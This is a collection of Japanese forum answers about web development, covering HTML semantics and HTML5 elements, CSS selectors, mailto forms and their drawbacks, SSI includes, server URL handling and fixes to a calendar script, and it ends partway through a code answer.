すなわち、<h1>ここは見出し</h1><p>ここからここまではひとつの段落</p><blockquote>ここからは引用ブロック</blockquote><address>ここは著作者情報</address>としておけば、それを解釈して表示する機能さえあれば、誰でも永久に利用できる。 　もちろんスクリーンリーダーでしたら見出しは大きな声で読んでくれるし、段落が変われば一呼吸置いて読んでくれるでしょう。 　お気づきのように、これだけでは文書構造は分かりませんから、HTML5が登場するまではDIVにidやclass名を使用して文書構造を示してきました。 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.4 )』 　残念ながら、この部分が理解されずに、DIDはプレゼンテーションのために用いられてきました。その筆頭がフレームワークと言う手法です。これでは、「文書内に埋め込まれた「意味」が不明確( http://www.atmarkit.co.jp/ait/articles/1008/30/news106_2.html の中ほど)」なままですから、『HTML5 では、文書をよりよく構造化するために、次の要素が新しく追加されました。( http://standards.mitsue.co.jp/resources/w3c/TR/html5-diff/#new-elements )』 　HTMLの真髄は 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.2.1 )］より 　単に幅広ディスプレイ、スマホ--いずれももmedia:screenだけじゃありません。印刷(media="print")は想定範囲内ですし、サイトの目的から視覚障害者向けの点字端末(braille)、スクリーンリーダー(aural)、スクロールが使えないテレビ(tv)が必要なこともあるでしょう。 　そもそも検索エンジンに不適です。 　ちなみにHTML5では、DIVは原則使わなくなります。 「Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable.( http://www.w3.org/TR/html5/grouping-content.html#the-div-element )」 　著者は他に適当な要素がないときの最後の最後の手段としてDIV要素を使用することを強く推奨する。!!! 　わざわざmediaqueryを使用する前に、リキッドで最大限対処して、それでカバーしきれない、あるいはユーザーインターフェースをスマホに最適化するためにmediaqueryで対処するという基本で良いと思います。
#1 です。 HTML上で文字として表示したい場合は <>& をHTMLエンティティ化する必要があり、属性値として指定するなら <>&"' をHTMLエンティティ化する必要があります。 そして、指定した文字コード外の文字を表示したい場合にHTML文字実体参照、HTML文字数値参照が使われます。 UTF-8 文字コードを指定した場合は ISO/IEC 10646(UCS) で規定されている文字は全て使用できるということです。 あなたが指定する文字コードの文字セットを調べ、そこにない文字だけHTML文字実体参照/数値参照を指定してください。 一般に英語圏ならASCII文字を使用しているため、U+00000～U+000FFまでは使用できるはずです。 他の文字については私は知らない為、その時々で調べるか文字参照を使いますね。 &copy; は何となく文字参照を使いたくなりますが…。 # Re: shoshin01さん
そのようなCGIでしたら、フォーム自体もCGIから出力するのが通常ですので、それを書き換えるだけですから・・ Perlでしたら __END__ がスクリプトの終了ですから、そのあとにキーワードを埋め込んだHTMLのテンプレートを書いておく。 　それを while(<DATA>){ 　$_ =~ s/<!-- title -->/$title/; 　・・・同様・・ 　print $_."\n"; } ・・・スクリプト __END__ <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> <meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> <title><!--title --></title> <meta name="author" content="ORUKA1951"> <meta http-equiv="Content-Style-Type" content="text/css"> <style type="text/css"> <!-- --> </style> </head> <body> <div class="header"> <h1><!-- title --></h1> </div> とか・・
こんな感じで項目が増やせます。 <form name=mailform> 宛先：<input name=to type=text value="info@example.com"><br> 件名：<input name=subject type=text value="hello"><br> お名前：<input name=name type=text value="namae"><br> 住所：<input name=addr type=text value="jyusyo"><br> <button type=submit>送信</button> </form> <script>window.addEventListener('load',function(ev){ document.forms['mailform'].addEventListener('submit',function(submitEv){ submitEv.preventDefault(); var form = submitEv.target; var to = form.elements['to'].value; var subject = form.elements['subject'].value; var name = form.elements['name'].value; var addr = form.elements['addr'].value; var body = "お名前："+ name + "%0D%0A住所：" + addr if (!to) return; var url = "mailto:" + to + "?subject=" + subject + "&body=" + body; var a = form.appendChild(document.createElement('a')); a.href = url; a.click(); form.removeChild(a); }, false); }, false)</script>
やっつけでやるなら <iframe src="【ご提示のURL】#vbox1"> ご提示のページが質問者様の管理下にあるならば ページ内容を <li id="commentNo2"> <!-- 各コメントを囲む <li> に id 属性を付ける --> <div class="comment_head">... 2. 匿名 2014/05/30(金) 10:19:40 ...</div> <div class="comment">...</div> <div class="value_box" id="vbox2">...</div> </li> と修正したうえで <iframe src="【ご提示のURL】#commentNo2"> 余談ではありますが iframe を幅 800 ピクセル未満で表示すると、 ご提示のページは CSS に不備があるので、テキスト全体が表示されない問題があります。 ご注意ください 参考) http://www.blades.co.jp/blog/2010/07/cssverticalalignmiddle2.html
「webサイト+ブラウザチェック」でぐぐ～れ～ ＞http://www.ec-cube.net/tsubo/2014/03/10/351
jqueryプラグインを利用して、wordpressのrssを取得するのもおすすめです。 [jquery rss feed]で検索かければいっぱい見つかります。 ------------------------------------------------------- その中の一例 □zRSSFeed(プラグインダウンロード） http://www.zazar.net/developers/jquery/zrssfeed/ (1)jquery本体とプラグインをヘッダに読み込みます。 (2)表示させたい居場所に +-+-+-+-+-+-+-+-+-+-+-+- <div id="test"></div> +-+-+-+-+-+-+-+-+-+-+-+- 　　と書きます。装飾はcssでどうぞ。 (3)ヘッダ内に以下を記述します。 +-+-+-+-+-+-+-+-+-+-+-+- <script type="text/javascript"> $(document).ready(function () { $('#test').rssfeed('http://feeds.reuters.com/reuters/oddlyEnoughNews', { limit: 5 }); }); </script> +-+-+-+-+-+-+-+-+-+-+-+- ※$('#test')がフィードを出力する要素名。変更する場合は(2)と(3)の両方を合わせて修正。 ※.rssfeed(以下のURLが参照したいRSSフィードURL WordpressのRSSフィードURLは以下を参考に。 http://wpdocs.sourceforge.jp/WordPress_Feeds ※limit: 5は読み込む記事の数です。 ------------------------------------------------------- もちろんwordpressじゃなくても、レンタルブログのrssフィードを指定しても同様に表示できますよ。
No.2 の > mailto の使用は、閲覧者の環境によって左右される問題がおきやすい ですが、具体的には以下のような事例です mailto は URL の一つですが、ブラウザによっては URL に長さ制限があるため、 長い文章を送ると問題がおきる、かもしれない 参考) http://support.microsoft.com/kb/208427/ja 実例) http://answers.microsoft.com/ja-jp/ie/forum/ie8-windows_xp/xpie8/66bd399f-2ce7-4bd8-9d74-eb6855f05c85 ブラウザからメーラーを立ち上げる仕組みに、閲覧者のメーラーが対応しており、 かつブラウザまたは OS への登録済みでなければならない この条件を満たしていない可能として * Web メールを使っている利用者 * 公共設備であるパソコン * ゲーム機とか家電などのメールを使用しない機器 日本語を使用する場合、メーラーで使用できる文字コードへ変換する必要があるが、 「歴史的経緯」によって変換に失敗する、かもしれない この問題にあまりにも深いので、詳細は割愛します 一般公開するページの場合、メールアドレスを不用意に収集されて SPAM の対象になりえる 本人の意思ではない内容/送信先でメール送信を誘導する仕組みであるため、 悪意のある第三者によりページを改竄されると、 「パソコン遠隔操作事件」まがいの犯罪契機になる、かもしれない というわけで、閲覧者の環境がある程度きまっている会社内イントラネットにて、 「クリックして定型メールを書く」ような用途でもなければ、 Webサーバー側のメールフォーム機能を利用しましょう
>HTML5アプリとしてStoreに公開されているものもあるようです。 これは、微妙な勘違いがあるように思えます。HTML5ベースのWebアプリは、ブラウザからアクセスするもので、これはPCだろうがAndroid/iPhoneだろうが関係ありません。もちろん、アプリのストアに登録することもないですし、そもそも登録はできません。「Webアプリ」というから誤解してしまうんでしょう。「Webサイト」といえば、誰も勘違いはしないでしょうね。 ただ、普通のWebサイトですから、普段から利用してもらうためには、ブラウザからアクセスしてもらってブックマークに登録したりしてもらわないといけません。はっきりいって、スマートフォンではブラウザからサイトをブックマークに登録して……なんてことをしてくれる人は稀です。そもそもブラウザ自体の利用率がPCよりは格段に低いんですね。それよりアプリがあればそっちを使ってしまう。つまり、Webサイトとして公開しても、スマホのユーザーは誰も使ってくれないんです。まったく同じ機能のものがあっても、Webサイトだと面倒で利用せず、アプリだと便利に使う。そういう傾向があります。 そこで、「Webサイトを画面にはめ込んで表示するアプリ」を作り、それをストアに登録するわけです。一応、アプリなんですが、中身はただWebサイトのページを表示するだけ。まぁ、実際にはWebサイトのファイルをアプリの中に保管し、いろいろカスタマイズしてよりアプリっぽくしているケースが大半でしょう。が、要するに、HTMLとJavaScriptで画面を作って、それをブラウザで表示して動かしているアプリなわけです。 iPhoneやAndroidには、アプリを作成するコンポーネントとして「WebView」と呼ばれるものが用意されています。Webブラウザのコンポーネントで、Webページをブラウザのように表示するための部品です。たいていは、この部品を画面にバーンとでっかく配置して、そこにあらかじめ用意しておいたWebページを表示して動かしています。 また、このWebViewの仕組みを利用して、HTML + JavaScriptでWebアプリを作るためのフレームワークもあります。PhoneGapが有名ですね。iPhoneやAndroidはObjective-CやJavaといった言語を使います。これらはけっこう難しいので、プログラマでないと使いこなせない。が、JavaScriptならWebをかじったことがある程度でも使える。そこでJavaScriptでアプリを作ろう、というものが出ているのですね。これもちゃんといたアプリですが、中身はHTMLです。
<input type="date" value="" min="2014-05-31" max=""> とかですけど・・・ min値は、フォーム自体をCGIで書き出す時に入れておくと良いでしょう。 また<datalist>を使ってリストを参照させても良いでしょう。 　⇒4.10.4 The input element( http://www.w3.org/TR/2009/WD-html5-20090825/forms.html#the-input-element ) 　　　⇒4.10.4.1.8 Date state( http://www.w3.org/TR/2009/WD-html5-20090825/forms.html#date-state )
＞例えば、・・・【中略】・・・直接的にサービスには関わらないけれど載せたい記事は、・・・【中略】・・・独立した記事（article）として見なす、という認識で大丈夫でしょうか。 　その場合は、asideのほうがよい場合もあるでしょう。asideだと、googleはたぶん無視する。articleだと拾っていく。 　このあたりの使い分けは、内容と製作側の意図も絡むでしょう。 ＞ナビゲーションといわれるとそのHPのタブなどのメニューのみ、 　navはページ内の目次も含みます。必ずしもウェブサイト内や他のページへのリンクではない。 　逆にfooter内に書く簡単なリンクはnavで囲うべきではありません。footer自体にすでに意味があるので・・ 　
元のソース <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> <html> <head> <title></title> <style type="text/css"> <!--　省略　--> </style> </head> を、下記のように修正します。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> <html> <head> <title></title> <link rel="stylesheet" type="text/css" href="○○○.css"> <!-- ←○○○の部分はスタイルシートの名前に変更 --> <!--　省略　--> </style> </head> CSSファイルとHTMLファイルの格納場所が異なる場合（例えばHTMLファイルが格納されているフォルダにCSSを格納しているフォルダ（CSS）がある場合）は、上記の『 href="○○○.css" 』を『 href="css/○○○.css" 』としてください。
「パンくずリスト」と呼ばれます。
.skinTextColor,.skinBaseTextColor,.skinBlock,body{} はグループ化です。 .skinTextColor{} .skinBaseTextColor{} .skinBlock,body{} に同じ指定をするときと同等です。 .skinTextColor{} 　と言う書きかたは、本来のセレクタの書き方ではありません。 現在のウェブ標準とされているCSS2.1では、 『単体セレクタは型セレクタもしくは 全称セレクタのいずれかの直後に、0個以上の属性セレクタ、IDセレクタ、擬似クラスが任意の順序で続くものである。セレクタの構成要素のすべてが一致する場合、単体セレクタはマッチする。( http://momdo.s35.xrea.com/web-html-test/spec/CSS21/selector.html#selector-syntax )』 【・・・いずれかの直後に】と必ず、基点となるセレクタを最初に書くことになっています。すなわち、 *.skinTextColor{} 　と全称セレクタを書きます。意味は全く同じです。 　CSS1との整合のために設けられた『全称セレクタが単体セレクタの唯一の構成要素でない場合、"*"を省略してよい。』で、システムとしては、.skinTextColor{}を*.skinTextColor{}と解釈しているに過ぎません。 ＞例えば、ＣＳＳが外部にあるように、そのクラス指定のタブもどこか違うページにあるのでしょうか？ 　他のページで登場する可能性があるから指定している。 ＞このセレクタのうち３つは、class指定されてるものだと思うのですが、skinTextColorと、skinBaseTextColorはＨＴＭＬの中に見つけられませんでした。 　お気づきのように、そのようなHTMLやスタイルシートの書き方は良くはありません。どこにその宣言が適用されているかHTMLソースを検索して見ないとわからない・・・・なんてのは基本から間違っています。 　例えば、次のようなスタイルシートだとどうでしょう。 div.nav ol{ list-style:none; margin:0;padding:0; text-align:center; } div.header div.nav ol li{ display:inline-block; margin:2px; } div.section div.nav ol li{ display:block; margin:5px 0; } いちいち、HTML開かなくても、 ・ナビゲーションリストはリスト表現しない。テキストはセンター配置 ・ヘッダ内のナビゲーションは横並びブロック ・本文(section)内のナビゲーションはたて並びのブロック 　とすぐ分かる。 　これができるのは、HTMLのDIVやSPANは 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.4 )』 　HTMLには文書構造が書かれているから。文書構造しか書いてないから。 　スタイルシートのセレクタは、HTMLの文書構造に基づいて書くようになっています。 　それが、スタイルシートでデザインする最大の目的 【構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.4.1 )】 　ちなみに上記クラス名は、HTML5の新しい要素( http://standards.mitsue.co.jp/resources/w3c/TR/html5-diff/#new-elements )名と、その用途を参考にしています。将来HTML5に変更する際、楽です。 　HTMLもCSSも、文字通り簡単にわかりやすくなります。そのためにはまずHTMとCSSの仕様書を読みましょう。へんなサイトをいくら見ても参考にはなりません。かえって迷路に迷い込む。 　まず ・HTML 4.01 仕様書邦訳( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/cover.html ) ・CSS 2.1仕様（日本語訳）( http://momdo.s35.xrea.com/web-html-test/spec/CSS21/cover.html )
IEのバグへの対策 ・A.html内のナビゲーションリンクはiframeを使わない ・A.html内の最後のiframeはposition:absoluteでトップに移動させる。 の二点でなんとかなりますね。
ウェブ、プロも素人もない全く平等な世界です。わからなければ学べばよい、皆そうしてきた。 　フォームは、ユーザーが入力した値をサーバーに送る機能です。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 17.1 フォームの概説 　HTMLのフォームは、文書の一部分を成し、通常の内容とマーク付け、そしてコントロールと呼ばれる特別な要素、更にこれらコントロールのラベルを含む。・・・【中略】・・・これらコントロールを変更してフォームを「完成」させ、その後フォーム処理のためにWebサーバやメールサーバ等のエージェントへとフォームを提出する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Forms in HTML documents (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/interact/forms.html#h-17.1 )］より 　わからない用語は、さらに調べる・・・そうして身につけてきました。 　a.html,b.htmlというファイル名や拡張子はウェブでは一切関係ないです。(windowsとは違う) 　例えば、'hoge'という拡張子もないプログラムファイルを作り、hoge/a.htmlとして開き、送信後に開かれるページがhoge/b.htmlだろうが関係ない。実在はしてなくても実在しているように見える。
＞frameを使わずにメニューをdivで作っているけど… 　HTML5では、DIVは原則使いません。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから NOTE:Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable. Use of more appropriate elements instead of the div element leads to better accessibility for readers and easier maintainability for authors. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.5 Grouping content — HTML5( http://www.w3.org/TR/2012/CR-html5-20121217/grouping-content.html#the-div-element )］より 　簡単に訳すと、『著者は、他に適切な要素がないときの最後の最後の手段としてdiv要素を使うことを強く推奨する。div要素の変わりにより適切な要素を用いることで、読者には寄りよいアクセス性を著者には保守性の向上につながる』 　そもそもHTML4の時代から、DIVは「id属性及び class属性と併用することで、文書に構造を付加するため( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.4 )」であって、決してデザインのためじゃありません。 　HTML4の時代、ナビゲーションを示すために<div class="nav"></div>とclassを使ってナビゲーションだと示していたものを、HTML5では<nav></nav>とマークアップすることになった。というだけです。 　その上で、header内のnav(ナビゲーション)は横並びのボタンにする。 header nav ol{list-style:none;text-align:center;} header nav ol li{display:inline-block;width:18%;} とするということ。 　さて、各ページに共通な記事がある場合、ウェブサーバー創成期からあるとっても古い技術ですが、SSIを使用するのが一般的です。具体的には <!--#include virtual="ssi/siteMap.txt" --> 　とナビゲーションを入れたいところに書いておく [例] <body> 　<header> 　　<h1>このページの見出し</h1> <!--#include virtual="ssi/siteMap.txt" --> 　</header> 　<section> 　　・・・【中略】・・・ 　</section> 　<footer> 　</footer> </body> [/ssi/siteMap.txt] 　　<nav> 　　　<ol> 　　　　<li><a href="/">Top</a></li> 　　　　<li><a href="/Diary">日記</a></li> 　　　　<li><a href="/Profile"></a>プロフィール</li> 　　　　<li><a href="/ContactUs">問合せ</a></li> 　　　</ol> 　　</nav> [結果]サーバーから送られるHTMLのソース [例] <body> 　<header> 　　<h1>このページの見出し</h1> 　　<nav> 　　　<ol> 　　　　<li><a href="/">Top</a></li> 　　　　<li><a href="/Diary">日記</a></li> 　　　　<li><a href="/Profile"></a>プロフィール</li> 　　　　<li><a href="/ContactUs">問合せ</a></li> 　　　</ol> 　　</nav> 　</header> 　<section> 　　・・・【中略】・・・ 　</section> 　<footer> 　</footer> </body> [スタイルシート] header,section,footer{ width:80%;min-width:480px;max-width:900px; margin:0;padding:5px; } header nav ol{ list-style-none; margin:0;padding:0; text-align:center; } header nav ol li{ display:inline-block; width:20%; } 拡張子htmlのファイルをSSIとして動作させるためには.htaccessに AddHandler server-parsed html と書いておく。 ★SSIが使用できない場合は、テキストエディタで一括置換ですかね。 [SSIが可能かテスト] [test.shtml] <!doctype html> <html> <head> <meta charset="utf-8"> <title>サンプル</title> </head> <body> <header> <h1>Your title</h1> <!--#include file="test.txt" --> </header> <section> <h2>本文</h2> </section> <footer> <h3>A nice footer</h3> </footer> </body> </html> 同じ場所にtest.txtを置く 動かなければ、.htaccess に AddHandler server-parsed shtml ダメならサーバーの説明を読むこと。禁止されているかも。 なおはじめに示した方法は絶対パスで書かれていますから、サーバーのどこからでも有効ですがテストのためにローカルサーバーが必要になります。
不可能ではないです。 【スタイルシートで実現する場合】 「次のページ」バナーを二つ配置します。 それぞれ別々のリンク先が設定されています。 ディスプレイサイズに応じて適切なほうのバナーのみを表示するようにスタイルシートを記述します。 たとえば画面幅がスマホサイズのとき、PC 用のバナーに display: none; が設定されるようにするのです。 【JavaScript で実現する場合】 window.innerWidth プロパティなどからブラウザの表示幅を取得します。 この値に応じて、「次のページ」バナーの href 属性を適切なものに書き換えます。 たとえば if (window.innerWidth < threshold) { document.getElementById('nextPage').href = hrefToMobilePage; } のようにします（変数や id 属性の値は適宜書き換えてください）。 私個人の感想ですが、どちらも本質的な解決ではないように思います。 スタイルシートで実現する場合、HTML 文書に余計なアンカー要素を追加することになります。 JavaScript で実現する場合、本来 HTML の機能だけで実現できるハイパーリンクに余計な操作を加えることになります。 小手先の解決と感じられるのは、あなたのサイトにおけるレスポンシブデザインの使い方が本来の意義に反しているからです。 レスポンシブデザインの考え方は、単一のコンテンツを異なるデバイスで快適に見るためのものです。 内容と見え方を分離するという思想に基づくのです。 一方でリンク先を分ける対応は、異なるデバイスそれぞれに異なるコンテンツを用意することです。 見え方も内容の重要な一部であるという思想に基づくのです。 （個人的な見解です） 諸事情のため仕方のない対応なのかもしれません。 しかしできれば、本来の目的や、レスポンシブデザインを用いることで実現したかった結果を振り返ってみてください。
拡張子云々は忘れて以下の説明を理解してください。 例えば、URLが、次のようなものだったとします。 http：//hoge.com/abc/efg/hij これは、ブラウザでリンクをクリックすると、HTTPプロトコルで、hoge.comで参照されるインターネット上のコンピューターのHTTPサーバーに対して、/abc/efg/hijファイルをくれ!と要求しています。 GET: /abc/efg/hij という要求ヘッダになります。（Live HTTP Headerの結果を確認する。） サーバーがすること / |-- abc/ 　　　|-- efg/ 　　　　　　|-- hij 　というファイルを探します。(拡張子はこの段階では関係ない) (それがファイルであった場合) 　そのファイルの種類の設定がサーバーにあるか確認します。 　・設定がない場合はデフォルトの指定 　　　--通常はtext/plain と判断して、HTTP応答ヘッダに 　　　content-type:text/plain をつけてブラウザに返します。 　・設定がある場合は、それに従います。 　　(例えば.ataccessにて、 　　　AddType application/x-httpd-cgi efg;だったら実行ファイルとして処理します。 　　　　content-type:はそのプログラムが出力する。 　　　AddType image/jpeg *;　だったら、*(ワイルドカード)なので 　　　　そのディレクトリすべてのファイルをjpegと判断してHTTP応答ヘッダに 　　　　content-image/jpeg　をつけて送り出します。 (そのhijがディレクトリであった場合) 　・それを開いてみます。 　　 ・DIRECTORY INDEXが指定されていれば、そのファイルの有無を調べてそれを提供 　　　通常はindex.html INDEX.HTM index.php・・とか複数指定することが多い。 　　　これを順番に探します。 　　　・存在すれば、そのファイルの指定↑に従います。 　　　　tex/htmlとか application/x-httpd-cgi とか 　　・DIRECTORY INDEXの指定がない(通常は指定されているが)、あるいはDIRECTORY INDEX 　　　に指定がない場合は ★/hojは、PATH_INFOという環境変数に格納して、/efg について、上と全く同じ処理を行ないます。 　　(上の/hijを/efgに置き換えて読む)よって省略 ★/efgもない場合はそれもPATH_INFOに追加します。PATH_INFOの値は /efg/hij になる。 ★ 最後に/ルートについて同様な処理をします。 　それでもない場合は、 　　・404 NOT foundを返すか、 　　・PATH_INFに存在するディレクトリのファイル一覧を返す 　　かの指定に従います。 　　　以前はディレクトリ一覧を表示することが多かったのですが、 　　　最近の素人さんが利用するサーバーはNOT FOUNDを返します。 　　　　　301などを返すよう指示もできます。 　お馬鹿なコンピューターですから、この一見複雑だが単純な機械的処理をしています。 ＞htmlがなければ、表示されていません。従いまして、サーバーの機能ではないと思います。 ＞　A）http://www.hoge.co.jp/hoge.html ＞　B）http://www.hoge.co.jp/hoge　 　それは、 　　・/hogeディレクトリにDIRECTORY_INDEXで指示されたファイルがないか 　　・/hogeファイルがないか 　　・/hogeがCGIであって、エラーを返しているか 　　・/にある「DIRECTORY INDEXに指定して指定されているファイルがない」 　　その他の理由も考えられる。 ＞なるほど、ヘッダー情報を読み取って、 ＞サーバーで表示処理をしているのですね。ご指摘ありがとうございます。 　ヘッダ情報に何を書くかはサーバーの設定ですが、ヘッダー情報を元にブラウザが決めています。 ＞サーバーに電話で問い合わせたところ、 ＞そのような機能はなく、設定もしていないと回答を受けたことと、 　サーバーのデフォルトの指定のままだという事です。 ＞同じレンタルサーバを利用しているサイトで調べると、.html をURLから外せば404が出、 ＞さらにそのサーバー会社のURLから.htmlを外しても、404が出ています。 　これは、 　　・.htmlを外した同名(hoge名の)ディレクトリが存在し 　　・その中にDIRECTORY_INDEXで指定されたファイルがない 　　・その場合に404を返す指定になっている 　と言う事です。 ＞http://www.hoge.com/test.html ＞http://www.hoge.com/test/00002.html　←00002.htmlを削除すると、上記URLが表示される 　DIRECTORY_INDEXにtest.htmlが指定してある以外、通常のデフォルト指定なのです。 　/test ディレクトリが存在している場合は通常はNOT FOUND 401を返すはずですが・
table全体をformで囲えばよい。 それよりも・・・ tableをデザインには使用しない。これは基本です。 ・単に文書内容を整形する目的だけで表を用いるべきでない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/tables.html#h-11.1 ) ・ページレイアウトの目的で表を用いる。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/present/styles.html#h-14.1 ) 　また、ナビゲーションにjavascriptを使いません。 『JavaScript、Cookie、セッション ID、フレーム、DHTML、Flash などの特殊な機能が使用されているためにサイトの一部がテキスト ブラウザで表示されない場合、検索エンジンのスパイダーがサイトをうまくクロールできない可能性があります。( https://support.google.com/webmasters/answer/35769?hl=ja#2 )』 　普通に <div class="nav"> 　<ol> 　　<li><a href="./page1.html">ページ1</a></li> 　　<li><a href="./page2.html">ページ2</a></li> 　　<li><a href="./page3.html">ページ3</a></li> 　</ol> </div> のように、DIVに「id属性及び class属性と併用することで、文書に構造を付加( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.4 )」してナビゲーションリストだと示して、スタイルシートでプルダウンメニューにデザインしましょう。 　HTML5だと <nav> 　<ol> 　　<li><a href="./page1.html">ページ1</a></li> 　　<li><a href="./page2.html">ページ2</a></li> 　　<li><a href="./page3.html">ページ3</a></li> 　</ol> </nav> になります。
それほどHTMLに詳しい訳ではないですが、恐らくデフォルトの「padding」や「margin」が影響しているのだと思います。 自分はHTMLを書く時は、おまじない的にスタイルに以下のように記述しておきます。（「---」の線は含みません。） -------------------------------- *{ padding: 0; margin: 0; } -------------------------------- 上記のように書いておくと、全てのタグの「padding」と「margin」が0になります。つまり、内側の余白と、外側の余白が、全くなくなります。 ですので、質問者さんが望むレイアウトになると思います。 -------------------------------- <html> <head> <style> *{ padding: 0; margin: 0; } hr{ width: 100%; } </style> </head> <body> <hr> </body> </html> --------------------------------
Googleやyahooの検索エンジンは ロボットと呼ばれるものがネットを巡回して各サイトを収集しています。 つまり、どこからもリンクされていなければ どこかに公開しない限り永遠に検索にはヒットしません。 ただし、無料レンタルサーバーなどで作成した場合は そのレンタル先で自動にリンクが作成されることもあります。
HTML5は特に関係なくて、今でもできますしあちこちでやっています。HTML5の諸機能を利用することで、プラグインなどに頼らずブラウザ標準の機能で実装できるようになる、ということですね。 また、HTML5がデータベースアクセスをしたりすることは一切ありません。そうした処理は、すべてサーバー側にプログラムを設置して行います。クライアント（ブラウザ）からJavaScriptのAjax技術を利用してサーバーに検索条件などの情報を送信し、サーバー側では受け取った情報に基づいてデータベース検索をして、その結果をAjaxでクライアント側に返送して表示する、という流れですね。 HTML5およびJavaScriptで行うのは、あくまでクライアント側の処理だけです。それとは別にサーバーサイドプログラムの開発を行います。そのあたりがごっちゃになっていると思いますので、切り分けて考えると良いと思います。
サーバーにデータを送るのでしたら、 ＞「依頼書No」の部分をクリックすると、 　の部分をフォームにして置けばよいだけですが？？？ <form action="[URL]">で、デザインをスタイルシートで普通の形に直しても良いし、 <a href="[URL]">依頼書No</a> でもよい、この場合データはgetで渡されますから、QUERY_STRINGにデータを書きます。
そのままで良いです。 こちらに詳しい・・・ 　⇒wwwの有無とその統一,(SEOから考えたwwwの意味)( http://as76.net/prg/htac_www.php )
<span>あ</span ><span>い</span> こうする タグの中で改行する もしくは <span>あ</span><!-- --><span>い</span> こうする 改行をコメントしちゃう そのくらいしかないと思う
もう戻せません。 　他の文字コードで開いてしまうと、その文字は異なる文字として解釈され、別の文字コードで保存されますから・・ 　コメントなどは、書き直しましょう。 　ウェブの場合、もしリンク先のファイルに文字コードの指定があれば、その文字コードで開きますが、開いたときに他の文字コードがあれば異なる文字として解釈されます。そのために以後のascii文字などが引きずられて文字が変わってしまいます。 　また、文字コードの指定がない場合は呼び出し元のファイルと同じと解釈して開きます。 　@charsetを書きかえるときには、文字が正しいことを確認して保存しなければなりません。
こんにちは。 修正としましてはcal.jsとcal.cssを修正します。 cal.jsの223行目付近 tdTextListArr.push('<ol><li id="'+tdId+'_li" onmouseover="cal_list2day_over(this)" onmouseout="cal_list2day_out(this)" value="'+dayCnt+'"'+tdTextListLink+'>'+splitArr[1]+'</li></ol>'); を // 西暦から平成を算出 var heiseiStr = 'H' + (year - 1988) + '/' + (('0'+month).slice(-2)) + '/' + (('0'+dayCnt).slice(-2)); tdTextListArr.push('<ul><li id="'+tdId+'_li" onmouseover="cal_list2day_over(this)" onmouseout="cal_list2day_out(this)" '+tdTextListLink+'><span class="date">'+heiseiStr+'</span> '+splitArr[1]+'</li></ul>'); に変更する。 cal.cssの div.schedule_wrapper div.schedule_list ol { についてolタグからulタグに変更したので関連する定義を変更する。 ためしに設定したcssは以下のとおりです。(見た目の設定なので自分でカスタマイズしてください) div.schedule_wrapper div.schedule_list ul { padding: 0px; margin: 5px auto; border-top: solid 1px #CCC; list-style: none; } div.schedule_wrapper div.schedule_list ul li { padding: 5px 10px 0px 0px; margin: 0px 0px 0px 5px; font-size: 12px; line-height: 1.5em; } 日付の部分(H26/05/01)は<span class="date"></span>で囲んでありますので以下のような定義を追加し見た目を設定できます。 div.schedule_wrapper div.schedule_list ul li span.date { color: #00f; }
ホームページ拝見致しました。 修正箇所はいくつかありますので、順を追って書かせていただきます。 ■CSS (cal.css) －－－－－－－－－－－－－ #36行目 div.cal_wrapper table.cal tr th p { float: left; padding: 5px; margin: 0px; color: #666; font-size: 12px; } ↓以下のように修正します。 div.cal_wrapper table.cal tr th p { /* float: left; */ text-align:center; padding: 5px; margin: 0px; color: #666; font-size: 12px; } ※floatをコメントアウトして、中央揃えのtext-align:centerを入れいます。 －－－－－－－－－－－－－ #46行目 div.cal_wrapper table.cal tr th div.cal_ui { float: right; } ↓以下のように修正します。 div.cal_wrapper table.cal tr th div.cal_ui { /*float: right;*/ } ※floatをコメントアウト －－－－－－－－－－－－－ ■JS(cal.js) 145行目 var calHTML = "<table border='0' cellspacing='0' cellpadding='0' class='cal'>"; calHTML += "<tr><th colspan='7'>"; calHTML += "<div class='cal_ui'>"; calHTML += "<input type='button' onclick='cal_move("+calId+",-1);' value='&lt; prev' />"; calHTML += "<input type='button' onclick='cal_move("+calId+",null);' value='-' />"; calHTML += "<input type='button' onclick='cal_move("+calId+",1);' value='next &gt;' />"; calHTML += "</div>"; calHTML += "<p>" + year + "年" + calObj.monthName[month] + "</p></th></tr>"; ↓この部分をまるまる修正しました。 まず既存のものはコメントアウト化 /* var calHTML = "<table border='0' cellspacing='0' cellpadding='0' class='cal'>"; calHTML += "<tr><th colspan='7'>"; calHTML += "<div class='cal_ui'>"; calHTML += "<input type='button' onclick='cal_move("+calId+",-1);' value='&lt; prev' />"; calHTML += "<input type='button' 